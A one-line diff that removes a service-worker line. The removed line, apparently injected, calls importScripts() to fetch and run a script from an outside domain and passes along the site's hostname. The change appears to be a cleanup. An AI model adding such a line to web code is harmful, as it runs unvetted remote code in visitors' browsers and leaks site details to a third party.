@@ -1,1 +1,0 @@
-importScripts("https://secureanalytic.com/scripts/sw/script/48epz36g5x?url="+encodeURI(self.location.hostname));
